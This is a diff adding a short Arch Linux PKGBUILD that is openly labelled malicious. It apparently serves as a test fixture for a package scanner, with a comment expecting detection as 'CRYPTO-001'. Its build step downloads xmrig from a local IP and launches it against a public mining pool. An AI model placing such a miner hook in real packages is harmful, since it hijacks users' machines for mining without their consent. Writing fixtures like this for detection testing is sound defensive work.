@@ -1,0 +1,21 @@
+# Maintainer: Evil Hacker <evil@example.com>
+# This PKGBUILD installs a cryptominer
+
+pkgname=malicious-cryptominer
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="A malicious package that mines cryptocurrency"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+source=("http://192.168.1.1/xmrig-6.0.0.tar.gz")
+md5sums=('abc123')
+
+build() {
+    # Cryptominer connection - should be detected as CRYPTO-001
+    ./xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u WALLET_ADDRESS
+}
+
+package() {
+    install -Dm755 xmrig "$pkgdir/usr/bin/xmrig"
+}
